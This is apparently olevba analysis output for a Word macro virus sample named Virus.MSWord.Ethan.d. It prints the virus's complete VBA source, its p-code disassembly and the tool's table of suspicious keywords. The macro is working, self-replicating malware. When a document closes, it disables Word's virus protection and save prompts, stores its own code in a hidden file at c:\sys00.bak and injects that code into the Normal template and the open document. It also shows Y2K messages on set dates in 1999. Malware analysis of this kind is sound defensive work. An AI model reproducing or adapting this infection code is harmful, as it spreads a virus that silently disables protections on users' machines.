olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
'y2k
' Open Letter to the Virus Hunters
'
' This virus was written to help educate the
' public about the dangers of the approaching
' millennium bug. Please do not update your
' virus scanners to detect or clean this virus
' until after December 1, 1999.
'
' I know you won't do that, but what the heck.
'
' I tried.
'
' Bye!
'
On Error Resume Next

s = ActiveDocument.Saved

Application.EnableCancelKey = Not -1

With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With

Randomize

If Dir("c:\sys00.bak", 6) = "" Then
   Open "c:\sys00.bak" For Output As #1
   For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
      a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
      Print #1, a
      Next i
   Close #1
   SetAttr "c:\sys00.bak", 6
End If

If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'y2k" Then
   Set tf = NormalTemplate.VBProject.VBComponents.Item(1)
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'y2k" Then
   Set tf = ActiveDocument.VBProject.VBComponents.Item(1)
Else
   tf = ""
End If

If tf <> "" Then
   Open "c:\sys00.bak" For Input As #1
   If LOF(1) = 0 Then GoTo q
   i = 1
   Do While Not EOF(1)
      Line Input #1, a
      tf.CodeModule.InsertLines i, a
      i = i + 1
   Loop
q:
   Close #1
   ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
   If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End If

dd = Day(Now): mm = Month(Now): yy = Year(Now)
hh = Hour(Now): mm = Minute(Now): ss = Second(Now)

' only display messages for 1999
If yy <> 1999 Then
   GoTo end_here
End If

' only display messages until after lunch
If hh > 12 Then
   GoTo end_here
End If

t$ = Chr(13) + Chr(13)

'april 1, 1999
If dd = 1 And mm = 4 Then
   Title$ = "Y2K! Spread the word"
   msg$ = "This is not an April fools joke. I wish it were! The year 2000 is fast approaching, and the word still needs to be spread about the implications and dangers of the millennium bug commonly referred to as the Y2K bug. The virus that has infected this word document was written to help spread the word about the Y2K bug, and educate you so you can prepare yourself and your family for Saturday January 1, 2000."
   msg$ = msg$ + t$ + "From today until January 1, 2000, on the first business day of each month, I will give you a lesson in Y2K preparation."
   msg$ = msg$ + t$ + "Spread the word. Knowledge is power!"
   MsgBox msg$, vbCritical, Title$
End If

'May 3, 1999
If dd = 3 And mm = 5 Then
   Title$ = "Hello again!"
   msg$ = "Lets start our first lesson to help prepare you for the millennium bug. Although I don't personally believe there will be food shortages, power shortages, gas shortages as a result of a computer bug, there will be food, power and gas shortages by hoarding nitwits that fear the millennium bug. As a result, I highly recommend that you begin to stockpile bottled water (1-month supply), canned food (1-month supply), and as much gas as you can store (keep your vehicle gas tank always topped up starting December 1st)."
   msg$ = msg$ + t$ + "That's it for this month. See you next month!"
   MsgBox msg$, vbCritical, Title$
End If

'June 1, 1999
If dd = 1 And mm = 6 Then
   Title$ = "How's the weather?"
   msg$ = "Right now it's pretty warm out, so you are probably not thinking much about the winter. But remember the millennium bug is expected to hit in the middle of winter. If you're in a northern climate, like the Great White North (Canada), I suggest you consider purchasing a good airtight wood stove, and at least a face cord of wood. Even if there are no disruptions in natural gas, or oil, or electricity, the wood stove is a great way of reducing your heating bills. And if there is a problem, you will be comfortable in your own heated home, unlike your unprepared neighbors (remember the Canadian ice storm last year!)"
   msg$ = msg$ + t$ + "That's it for this month. See you next month!"
   MsgBox msg$, vbCritical, Title$
End If

'July 2, 1999
If dd = 2 And mm = 7 Then
   Title$ = "Did you get the stove?"
   msg$ = "Last month I recommend purchasing a gas stove to help heat your home in the event that your supply of electricity, gas, or oil was interrupted. This month I would like to suggest that you purchase a portable generator and enough gas cans to store gas to power the generator. The generator can be used to power lighting and small electrical appliances should the power be disrupted."
   msg$ = msg$ + t$ + "That's it for this month. See you next month!"
   MsgBox msg$, vbCritical, Title$
End If

'August 2, 1999
If dd = 2 And mm = 8 Then
   Title$ = "Getting back to basics"
   msg$ = "In this installment, I would like to suggest that you consider purchasing candles, matches, flashlights, and batteries. These items will be invaluable during those cold, dark nights should the power companies fail in their Y2K conversion. Don't plan on relying on the banks or credit/debit cards. Start each month, and stash away enough money to last you at least 2 months. This money should include enough money to pay the rent/mortgage, utilities, FOOD, etc. Remember cold hard cash is accept EVERYWHERE."
   msg$ = msg$ + t$ + "That's it for this month. See you next month!"
   MsgBox msg$, vbCritical, Title$
End If

'September 1, 1999
If dd = 1 And mm = 9 Then
   Title$ = "A Limerick"
   msg$ = "The millennium 's not far away"
   msg$ = msg$ + Chr(13) + "Get onto your coding today"
   msg$ = msg$ + Chr(13) + "Fix it or fudge it"
   msg$ = msg$ + Chr(13) + "The boss won't begrudge it"
   msg$ = msg$ + Chr(13) + "If everything works on the day!"
   msg$ = msg$ + t$ + "That's it for this month. See you next month!"
   MsgBox msg$, vbCritical, Title$
End If

'October 1, 1999
If dd = 1 And mm = 10 Then
   Title$ = "Three months to go"
   msg$ = "Getting nervous? If you've followed my advice over the past months, there should be nothing for you to worry about. We will survive the Y2K bug, but preparation will insure that if there is any Y2K crisis, it will only be small bump on the road, not a major pothole for you."
   msg$ = msg$ + t$ + "That 's it for this month. See you next month!"
   MsgBox msg$, vbCritical, Title$
End If

'November 1, 1999
If dd = 1 And mm = 11 Then
   Title$ = "Two months to go"
   msg$ = "Personally, I don't believe that there will be a major, global Y2K crisis. I trust the banks with my money, I trust MOST of the industrial sector, and I trust the power and water agencies to provide me with power and water over the ""infamous"" weekend. I even trust the Russians and there nuclear arms! BUT you can never be too careful. Take care. Be prepared. Use common sense."
   msg$ = msg$ + t$ + "That 's it for this month. See you next month!"
   MsgBox msg$, vbCritical, Title$
End If

'December 1, 1999
If dd = 1 And mm = 12 Then
   Title$ = "Good Luck (30 days to go)"
   msg$ = "Well, this will be the final installment in the Y2K preparation lessons. If you have followed my advice over the past few months, you will be in excellent shape to bring in the New Year. May the New Year bring you health and happiness. Best wishes."
   msg$ = msg$ + t$ + "Bye!"
   MsgBox msg$, vbCritical, Title$
End If

end_here:

End Sub
Private Sub Document_New()

End Sub
Private Sub OptionButton1_Click()

End Sub

Private Sub OptionButton2_Click()

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ethan.d
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 14391 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	QuoteRem 0x0000 0x0003 "y2k"
' Line #2:
' 	QuoteRem 0x0000 0x0021 " Open Letter to the Virus Hunters"
' Line #3:
' 	QuoteRem 0x0000 0x0000 ""
' Line #4:
' 	QuoteRem 0x0000 0x002B " This virus was written to help educate the"
' Line #5:
' 	QuoteRem 0x0000 0x002C " public about the dangers of the approaching"
' Line #6:
' 	QuoteRem 0x0000 0x002A " millennium bug. Please do not update your"
' Line #7:
' 	QuoteRem 0x0000 0x002D " virus scanners to detect or clean this virus"
' Line #8:
' 	QuoteRem 0x0000 0x001E " until after December 1, 1999."
' Line #9:
' 	QuoteRem 0x0000 0x0000 ""
' Line #10:
' 	QuoteRem 0x0000 0x002D " I know you won't do that, but what the heck."
' Line #11:
' 	QuoteRem 0x0000 0x0000 ""
' Line #12:
' 	QuoteRem 0x0000 0x0009 " I tried."
' Line #13:
' 	QuoteRem 0x0000 0x0000 ""
' Line #14:
' 	QuoteRem 0x0000 0x0005 " Bye!"
' Line #15:
' 	QuoteRem 0x0000 0x0000 ""
' Line #16:
' 	OnError (Resume Next) 
' Line #17:
' Line #18:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St s 
' Line #19:
' Line #20:
' 	LitDI2 0x0001 
' 	UMi 
' 	Not 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #21:
' Line #22:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndWith 
' Line #23:
' Line #24:
' 	ArgsCall Read 0x0000 
' Line #25:
' Line #26:
' 	LitStr 0x000C "c:\sys00.bak"
' 	LitDI2 0x0006 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #27:
' 	LitStr 0x000C "c:\sys00.bak"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #28:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #29:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St a 
' Line #30:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld a 
' 	PrintItemNL 
' Line #31:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #32:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #33:
' 	LitStr 0x000C "c:\sys00.bak"
' 	LitDI2 0x0006 
' 	ArgsCall SetAttr 0x0002 
' Line #34:
' 	EndIfBlock 
' Line #35:
' Line #36:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0004 "'y2k"
' 	Ne 
' 	IfBlock 
' Line #37:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set tf 
' Line #38:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0004 "'y2k"
' 	Ne 
' 	ElseIfBlock 
' Line #39:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set tf 
' Line #40:
' 	ElseBlock 
' Line #41:
' 	LitStr 0x0000 ""
' 	St tf 
' Line #42:
' 	EndIfBlock 
' Line #43:
' Line #44:
' 	Ld tf 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #45:
' 	LitStr 0x000C "c:\sys00.bak"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #46:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo q 
' 	EndIf 
' Line #47:
' 	LitDI2 0x0001 
' 	St i 
' Line #48:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #49:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #50:
' 	Ld i 
' 	Ld a 
' 	Ld tf 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #51:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #52:
' 	Loop 
' Line #53:
' 	Label q 
' Line #54:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #55:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #56:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld s 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld s 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	EndIf 
' Line #57:
' 	EndIfBlock 
' Line #58:
' Line #59:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	St dd 
' 	BoS 0x0000 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	St mm 
' 	BoS 0x0000 
' 	Ld Now 
' 	ArgsLd Year 0x0001 
' 	St yy 
' Line #60:
' 	Ld Now 
' 	ArgsLd Hour 0x0001 
' 	St hh 
' 	BoS 0x0000 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	St mm 
' 	BoS 0x0000 
' 	Ld Now 
' 	ArgsLd Second 0x0001 
' 	St ss 
' Line #61:
' Line #62:
' 	QuoteRem 0x0000 0x001F " only display messages for 1999"
' Line #63:
' 	Ld yy 
' 	LitDI2 0x07CF 
' 	Ne 
' 	IfBlock 
' Line #64:
' 	GoTo end_here 
' Line #65:
' 	EndIfBlock 
' Line #66:
' Line #67:
' 	QuoteRem 0x0000 0x0028 " only display messages until after lunch"
' Line #68:
' 	Ld hh 
' 	LitDI2 0x000C 
' 	Gt 
' 	IfBlock 
' Line #69:
' 	GoTo end_here 
' Line #70:
' 	EndIfBlock 
' Line #71:
' Line #72:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St t$ 
' Line #73:
' Line #74:
' 	QuoteRem 0x0000 0x000D "april 1, 1999"
' Line #75:
' 	Ld dd 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld mm 
' 	LitDI2 0x0004 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #76:
' 	LitStr 0x0014 "Y2K! Spread the word"
' 	St Title$ 
' Line #77:
' 	LitStr 0x0197 "This is not an April fools joke. I wish it were! The year 2000 is fast approaching, and the word still needs to be spread about the implications and dangers of the millennium bug commonly referred to as the Y2K bug. The virus that has infected this word document was written to help spread the word about the Y2K bug, and educate you so you can prepare yourself and your family for Saturday January 1, 2000."
' 	St msg$ 
' Line #78:
' 	Ld msg$ 
' 	Ld t$ 
' 	Add 
' 	LitStr 0x0077 "From today until January 1, 2000, on the first business day of each month, I will give you a lesson in Y2K preparation."
' 	Add 
' 	St msg$ 
' Line #79:
' 	Ld msg$ 
' 	Ld t$ 
' 	Add 
' 	LitStr 0x0024 "Spread the word. Knowledge is power!"
' 	Add 
' 	St msg$ 
' Line #80:
' 	Ld msg$ 
' 	Ld vbCritical 
' 	Ld Title$ 
' 	ArgsCall MsgBox 0x0003 
' Line #81:
' 	EndIfBlock 
' Line #82:
' Line #83:
' 	QuoteRem 0x0000 0x000B "May 3, 1999"
' Line #84:
' 	Ld dd 
' 	LitDI2 0x0003 
' 	Eq 
' 	Ld mm 
' 	LitDI2 0x0005 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #85:
' 	LitStr 0x000C "Hello again!"
' 	St Title$ 
' Line #86:
' 	LitStr 0x0205 "Lets start our first lesson to help prepare you for the millennium bug. Although I don't personally believe there will be food shortages, power shortages, gas shortages as a result of a computer bug, there will be food, power and gas shortages by hoarding nitwits that fear the millennium bug. As a result, I highly recommend that you begin to stockpile bottled water (1-month supply), canned food (1-month supply), and as much gas as you can store (keep your vehicle gas tank always topped up starting December 1st)."
' 	St msg$ 
' Line #87:
' 	Ld msg$ 
' 	Ld t$ 
' 	Add 
' 	LitStr 0x002D "That's it for this month. See you next month!"
' 	Add 
' 	St msg$ 
' Line #88:
' 	Ld msg$ 
' 	Ld vbCritical 
' 	Ld Title$ 
' 	ArgsCall MsgBox 0x0003 
' Line #89:
' 	EndIfBlock 
' Line #90:
' Line #91:
' 	QuoteRem 0x0000 0x000C "June 1, 1999"
' Line #92:
' 	Ld dd 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld mm 
' 	LitDI2 0x0006 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #93:
' 	LitStr 0x0012 "How's the weather?"
' 	St Title$ 
' Line #94:
' 	LitStr 0x026A "Right now it's pretty warm out, so you are probably not thinking much about the winter. But remember the millennium bug is expected to hit in the middle of winter. If you're in a northern climate, like the Great White North (Canada), I suggest you consider purchasing a good airtight wood stove, and at least a face cord of wood. Even if there are no disruptions in natural gas, or oil, or electricity, the wood stove is a great way of reducing your heating bills. And if there is a problem, you will be comfortable in your own heated home, unlike your unprepared neighbors (remember the Canadian ice storm last year!)"
' 	St msg$ 
' Line #95:
' 	Ld msg$ 
' 	Ld t$ 
' 	Add 
' 	LitStr 0x002D "That's it for this month. See you next month!"
' 	Add 
' 	St msg$ 
' Line #96:
' 	Ld msg$ 
' 	Ld vbCritical 
' 	Ld Title$ 
' 	ArgsCall MsgBox 0x0003 
' Line #97:
' 	EndIfBlock 
' Line #98:
' Line #99:
' 	QuoteRem 0x0000 0x000C "July 2, 1999"
' Line #100:
' 	Ld dd 
' 	LitDI2 0x0002 
' 	Eq 
' 	Ld mm 
' 	LitDI2 0x0007 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #101:
' 	LitStr 0x0016 "Did you get the stove?"
' 	St Title$ 
' Line #102:
' 	LitStr 0x017D "Last month I recommend purchasing a gas stove to help heat your home in the event that your supply of electricity, gas, or oil was interrupted. This month I would like to suggest that you purchase a portable generator and enough gas cans to store gas to power the generator. The generator can be used to power lighting and small electrical appliances should the power be disrupted."
' 	St msg$ 
' Line #103:
' 	Ld msg$ 
' 	Ld t$ 
' 	Add 
' 	LitStr 0x002D "That's it for this month. See you next month!"
' 	Add 
' 	St msg$ 
' Line #104:
' 	Ld msg$ 
' 	Ld vbCritical 
' 	Ld Title$ 
' 	ArgsCall MsgBox 0x0003 
' Line #105:
' 	EndIfBlock 
' Line #106:
' Line #107:
' 	QuoteRem 0x0000 0x000E "August 2, 1999"
' Line #108:
' 	Ld dd 
' 	LitDI2 0x0002 
' 	Eq 
' 	Ld mm 
' 	LitDI2 0x0008 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #109:
' 	LitStr 0x0016 "Getting back to basics"
' 	St Title$ 
' Line #110:
' 	LitStr 0x01FA "In this installment, I would like to suggest that you consider purchasing candles, matches, flashlights, and batteries. These items will be invaluable during those cold, dark nights should the power companies fail in their Y2K conversion. Don't plan on relying on the banks or credit/debit cards. Start each month, and stash away enough money to last you at least 2 months. This money should include enough money to pay the rent/mortgage, utilities, FOOD, etc. Remember cold hard cash is accept EVERYWHERE."
' 	St msg$ 
' Line #111:
' 	Ld msg$ 
' 	Ld t$ 
' 	Add 
' 	LitStr 0x002D "That's it for this month. See you next month!"
' 	Add 
' 	St msg$ 
' Line #112:
' 	Ld msg$ 
' 	Ld vbCritical 
' 	Ld Title$ 
' 	ArgsCall MsgBox 0x0003 
' Line #113:
' 	EndIfBlock 
' Line #114:
' Line #115:
' 	QuoteRem 0x0000 0x0011 "September 1, 1999"
' Line #116:
' 	Ld dd 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld mm 
' 	LitDI2 0x0009 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #117:
' 	LitStr 0x000A "A Limerick"
' 	St Title$ 
' Line #118:
' 	LitStr 0x001E "The millennium 's not far away"
' 	St msg$ 
' Line #119:
' 	Ld msg$ 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001A "Get onto your coding today"
' 	Add 
' 	St msg$ 
' Line #120:
' 	Ld msg$ 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0012 "Fix it or fudge it"
' 	Add 
' 	St msg$ 
' Line #121:
' 	Ld msg$ 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001A "The boss won't begrudge it"
' 	Add 
' 	St msg$ 
' Line #122:
' 	Ld msg$ 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001F "If everything works on the day!"
' 	Add 
' 	St msg$ 
' Line #123:
' 	Ld msg$ 
' 	Ld t$ 
' 	Add 
' 	LitStr 0x002D "That's it for this month. See you next month!"
' 	Add 
' 	St msg$ 
' Line #124:
' 	Ld msg$ 
' 	Ld vbCritical 
' 	Ld Title$ 
' 	ArgsCall MsgBox 0x0003 
' Line #125:
' 	EndIfBlock 
' Line #126:
' Line #127:
' 	QuoteRem 0x0000 0x000F "October 1, 1999"
' Line #128:
' 	Ld dd 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld mm 
' 	LitDI2 0x000A 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #129:
' 	LitStr 0x0012 "Three months to go"
' 	St Title$ 
' Line #130:
' 	LitStr 0x0112 "Getting nervous? If you've followed my advice over the past months, there should be nothing for you to worry about. We will survive the Y2K bug, but preparation will insure that if there is any Y2K crisis, it will only be small bump on the road, not a major pothole for you."
' 	St msg$ 
' Line #131:
' 	Ld msg$ 
' 	Ld t$ 
' 	Add 
' 	LitStr 0x002E "That 's it for this month. See you next month!"
' 	Add 
' 	St msg$ 
' Line #132:
' 	Ld msg$ 
' 	Ld vbCritical 
' 	Ld Title$ 
' 	ArgsCall MsgBox 0x0003 
' Line #133:
' 	EndIfBlock 
' Line #134:
' Line #135:
' 	QuoteRem 0x0000 0x0010 "November 1, 1999"
' Line #136:
' 	Ld dd 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld mm 
' 	LitDI2 0x000B 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #137:
' 	LitStr 0x0010 "Two months to go"
' 	St Title$ 
' Line #138:
' 	LitStr 0x0179 "Personally, I don't believe that there will be a major, global Y2K crisis. I trust the banks with my money, I trust MOST of the industrial sector, and I trust the power and water agencies to provide me with power and water over the "infamous" weekend. I even trust the Russians and there nuclear arms! BUT you can never be too careful. Take care. Be prepared. Use common sense."
' 	St msg$ 
' Line #139:
' 	Ld msg$ 
' 	Ld t$ 
' 	Add 
' 	LitStr 0x002E "That 's it for this month. See you next month!"
' 	Add 
' 	St msg$ 
' Line #140:
' 	Ld msg$ 
' 	Ld vbCritical 
' 	Ld Title$ 
' 	ArgsCall MsgBox 0x0003 
' Line #141:
' 	EndIfBlock 
' Line #142:
' Line #143:
' 	QuoteRem 0x0000 0x0010 "December 1, 1999"
' Line #144:
' 	Ld dd 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld mm 
' 	LitDI2 0x000C 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #145:
' 	LitStr 0x0019 "Good Luck (30 days to go)"
' 	St Title$ 
' Line #146:
' 	LitStr 0x00F8 "Well, this will be the final installment in the Y2K preparation lessons. If you have followed my advice over the past few months, you will be in excellent shape to bring in the New Year. May the New Year bring you health and happiness. Best wishes."
' 	St msg$ 
' Line #147:
' 	Ld msg$ 
' 	Ld t$ 
' 	Add 
' 	LitStr 0x0004 "Bye!"
' 	Add 
' 	St msg$ 
' Line #148:
' 	Ld msg$ 
' 	Ld vbCritical 
' 	Ld Title$ 
' 	ArgsCall MsgBox 0x0003 
' Line #149:
' 	EndIfBlock 
' Line #150:
' Line #151:
' 	Label end_here 
' Line #152:
' Line #153:
' 	EndSub 
' Line #154:
' 	FuncDefn (Private Sub Document_New())
' Line #155:
' Line #156:
' 	EndSub 
' Line #157:
' 	FuncDefn (Private Sub OptionButton1_Click())
' Line #158:
' Line #159:
' 	EndSub 
' Line #160:
' Line #161:
' 	FuncDefn (Private Sub OptionButton2_Click())
' Line #162:
' Line #163:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |OptionButton1_Click |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

